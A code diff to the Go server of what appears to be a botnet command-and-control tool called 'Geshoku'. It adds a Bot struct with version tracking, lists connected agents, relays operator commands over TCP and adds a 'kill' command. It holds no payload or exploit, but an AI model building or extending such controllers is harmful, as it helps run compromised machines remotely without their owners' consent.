@@ -9,8 +9,16 @@ import (
 	"sync"
 )
 
-var agent_list = make(map[string]net.Conn)
+// Globals and defines
+type Bot struct {
+	ID      string
+	Conn    net.Conn
+	Version string
+}
+
+var agent_list = make(map[string]Bot)
 var lock = &sync.Mutex{}
+var bot_version = "0.0.1"
 
 func write_welcome() {
 	fmt.Println("-----------Geshoku------------")
@@ -28,14 +36,14 @@ func list_agents() {
 		return
 	}
 	fmt.Println("[Info] Agents connected:")
-	for agentID := range agent_list {
-		fmt.Printf("- %s\n", agentID)
+	for id, bot := range agent_list {
+		fmt.Printf("ID: %s, Version: %s\n", id, bot.Version)
 	}
 }
 
 func agent_interact(agentID string) {
 	lock.Lock()
-	conn, exists := agent_list[agentID]
+	bot, exists := agent_list[agentID]
 	lock.Unlock()
 
 	if !exists {
@@ -52,11 +60,14 @@ func agent_interact(agentID string) {
 			fmt.Printf("[Info] Exiting interaction mode\n")
 			return
 		}
-		_, err := conn.Write([]byte(command))
+
+		_, err := bot.Conn.Write([]byte(command))
 		if err != nil {
 			fmt.Printf("[Err] Failed to send command to %s: %v\n", agentID, err)
 		}
-
+		if command == "kill" {
+			return
+		}
 	}
 }
 
@@ -83,24 +94,28 @@ func handle_command(command string) {
 func handle_client(conn net.Conn) {
 	defer conn.Close()
 	buffer := make([]byte, 1024)
+	bot := Bot{
+		ID:      conn.RemoteAddr().String(),
+		Conn:    conn,
+		Version: bot_version,
+	}
 	lock.Lock()
-	agentID := conn.RemoteAddr().String()
-	agent_list[agentID] = conn
+	agent_list[bot.ID] = bot
 	lock.Unlock()
 	fmt.Printf("\r")
-	fmt.Printf("\n[Info] New agent connected: %s\n", agentID)
+	fmt.Printf("\n[Info] New agent connected: %s\n", bot.ID)
 	for {
 		//buffer = buffer[:0]
 		_, err := conn.Read(buffer)
 		if err != nil {
 			fmt.Println("[Info] Agent disconnected")
 			lock.Lock()
-			delete(agent_list, agentID)
+			delete(agent_list, bot.ID)
 			lock.Unlock()
 			return
 
 		}
-		fmt.Printf("[Info] %s : %s\n", agentID, buffer)
+		fmt.Printf("[Info] %s : %s\n", bot.ID, buffer)
 		fmt.Print("Command>")
 	}
 }
